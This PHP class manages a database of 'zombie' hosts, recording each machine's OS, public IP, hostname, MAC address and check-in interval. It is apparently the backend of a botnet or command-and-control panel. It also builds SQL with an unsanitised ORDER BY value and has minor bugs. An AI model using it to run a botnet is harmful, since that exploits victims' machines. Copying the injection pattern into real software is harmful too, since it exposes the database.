<?php
// 'user' object
class Zombie{
 
        // database connection and table name
        private $conn;
        private $table_name = "Zombies";
    
        // object properties
        public $username;
        public $registered_at;
        public $os;
        public $current_public_ip;
        public $current_hostname;
        public $current_current_mac_addr;
    
        // constructor
        public function __construct($db){
            $this->conn = $db;
        }

    // create new user record
    function create(){
    
        // insert query
        $query = "INSERT INTO " . $this->table_name . "
                SET
                    username = :username,
                    os = :os,
                    current_public_ip = :current_public_ip,
                    current_hostname = :current_hostname,
                    current_mac_addr = :current_mac_addr";
    
        // prepare the query
        $stmt = $this->conn->prepare($query);
    
        // sanitize
        $this->username=htmlspecialchars(strip_tags($this->username));
        $this->os=htmlspecialchars(strip_tags($this->os));
        $this->current_public_ip=htmlspecialchars(strip_tags($this->current_public_ip));
        $this->current_hostname=htmlspecialchars(strip_tags($this->current_hostname));
        $this->current_mac_addr=htmlspecialchars(strip_tags($this->current_mac_addr));
    
        // bind the values
        $stmt->bindParam(':username', $this->username);
        $stmt->bindParam(':os', $this->os);
        $stmt->bindParam(':current_public_ip', $this->current_public_ip);
        $stmt->bindParam(':current_hostname', $this->current_hostname);
        $stmt->bindParam(':current_mac_addr', $this->current_mac_addr);
    
        // execute the query, also check if query was successful
        if(!$this->usernameExists() && $stmt->execute()){
            return true;
        }
    
        return false;
    }

        // check if given username exist in the database
    function usernameExists(){
    
        // query to check if username exists
        $query = "SELECT id, username, os, current_public_ip, current_hostname, current_mac_addr
                FROM " . $this->table_name . "
                WHERE username = ?
                LIMIT 0,1";
    
        // prepare the query
        $stmt = $this->conn->prepare( $query );
    
        // sanitize
        $this->username=htmlspecialchars(strip_tags($this->username));
        //$this->os=htmlspecialchars(strip_tags($this->os));
        //$this->current_public_ip=htmlspecialchars(strip_tags($this->public_ip));
        //$this->current_hostname=htmlspecialchars(strip_tags($this->current_hostname));
        //$this->current_mac_addr=htmlspecialchars(strip_tags($this->current_mac_addr));
    
        // bind given username value
        $stmt->bindParam(1, $this->username);
    
        // execute the query
        $stmt->execute();
    
        // get number of rows
        $num = $stmt->rowCount();
    
        // if username exists, assign values to object properties for easy access and use for php sessions
        if($num>0){
    
            // get record details / values
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
    
            // assign values to object properties
            $this->id = $row['id'];
            $this->username = $row['username'];
            $this->os = $row['os'];
            $this->current_public_ip = $row['current_public_ip'];
            $this->current_hostname = $row['current_hostname'];
            $this->current_mac_addr = $row['current_mac_addr'];
            $this->refresh_secs = $row['refresh_secs'];
    
            // return true because username exists in the database
            return true;
        }
    
        // return false if username does not exist in the database
        return false;
    }
 
    // update a user record
    public function update(){

        if($this->usernameExists()) {
 
            // if no posted password, do not update the password
            $query = "UPDATE " . $this->table_name . "
                    SET
                        os = :os,
                        current_public_ip = :current_public_ip,
                        current_hostname = :current_hostname,
                        current_mac_addr = :current_mac_addr,
                        refresh_secs = :refresh_secs
                    WHERE id = :id";
        
            // prepare the query
            $stmt = $this->conn->prepare($query);
        
            // sanitize
            //$this->username=htmlspecialchars(strip_tags($this->username));
            $this->os=htmlspecialchars(strip_tags($this->os));
            $this->current_public_ip=htmlspecialchars(strip_tags($this->current_public_ip));
            $this->current_hostname=htmlspecialchars(strip_tags($this->current_hostname));
            $this->current_mac_addr=htmlspecialchars(strip_tags($this->current_mac_addr));
            $this->refresh_secs=htmlspecialchars(strip_tags($this->refresh_secs));
        
            // bind the values from the form
            //$stmt->bindParam(':username', $this->username);
            $stmt->bindParam(':os', $this->os);
            $stmt->bindParam(':current_public_ip', $this->current_public_ip);
            $stmt->bindParam(':current_hostname', $this->current_hostname);
            $stmt->bindParam(':current_mac_addr', $this->current_mac_addr);
            $stmt->bindParam(':refresh_secs', $this->refresh_secs);
        
            // unique ID of record to be edited
            $stmt->bindParam(':id', $this->id);
        
            // execute the query
            if($stmt->execute()){
                return true;
            }
        
            return false;
        }
    }

    function read($filter_by_username=False, $filter_by_datetime_bef=False,$filter_by_datetime_aft=False, 
                  $filter_by_os=False, $order_by='id'){

        // craft WHERE clause
        $filter = " WHERE ";

        // filter by username
        if ($filter_by_username && $filter_by_username !== '') {
            $filter = $filter . " username = :username";
            $enable_AND = True;
        }
        
        // filter by datetime
        if ($filter_by_datetime_aft) {
            //if ($filter_by_username) {$filter = $filter . " AND ";}
            if ($enable_AND) {$filter = $filter . " AND ";}
            else {$enable_AND = True;}
            $filter = $filter . "registered_at >= :datetime_aft";
            }
        if ($filter_by_datetime_bef) {
            //if ($filter_by_username or $filter_by_datetime_aft) {$filter = $filter . " AND ";}
            if ($enable_AND) {$filter = $filter . " AND ";}
            else {$enable_AND = True;}
            $filter = $filter . "registered_at <= :datetime_bef";
        }

        // filter by os
        if ($filter_by_os) {
            if ($enable_AND) {$filter = $filter . " AND ";}
            else {$enable_AND = True;}
            $filter = $filter . "os = :os";
        }

        // set empty if filter or order_by not provided
        if (!$filter_by_username && !$filter_by_datetime_aft && !$filter_by_datetime_bef && !$filter_by_os) { $filter = ""; }
        $order_by = ($order_by) ? " ORDER BY " . $order_by : 'id' ;

        // query
        $query = "SELECT id, username, registered_at, os, current_public_ip, current_hostname, current_mac_addr, refresh_secs
                FROM " . $this->table_name . "
                {$filter}
                {$order_by} DESC";
    

        // prepare the query
        $stmt = $this->conn->prepare( $query );

        // sanitize, and bind filters
        if($filter_by_username){
            $username=htmlspecialchars(strip_tags($filter_by_username));
            $stmt->bindParam(':username', $username);
        }
        if($filter_by_os){
            $os=htmlspecialchars(strip_tags($filter_by_os));
            $stmt->bindParam(':os', $os);
        }
        if($filter_by_datetime_aft){
            $datetime_aft=htmlspecialchars(strip_tags(date('Y-m-d H:i:s', strtotime($filter_by_datetime_aft)) . ":00"));
            //$datetime_aft=(date('Y-m-d H:i:s', strtotime($filter_by_datetime_aft)));
            $stmt->bindParam(':datetime_aft', $datetime_aft);
        }
        if($filter_by_datetime_bef){
            $datetime_bef=htmlspecialchars(strip_tags(date('Y-m-d H:i:s', strtotime($filter_by_datetime_bef)) . ":00"));
            $stmt->bindParam(':datetime_bef', $datetime_bef);
        }

        //print_r($query);
    
        // execute the query
        $stmt->execute();
    
        // get number of rows
        $num = $stmt->rowCount();
    
        // if username exists, assign values to object properties for easy access and use for php sessions
        if($num>0){
    
            // get record details / values
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
    
            // return true because username exists in the database
            return $rows;
        }
        //print_r($stmt->errorInfo());
        // return false if any log exists
        return false;
    }

}

?>
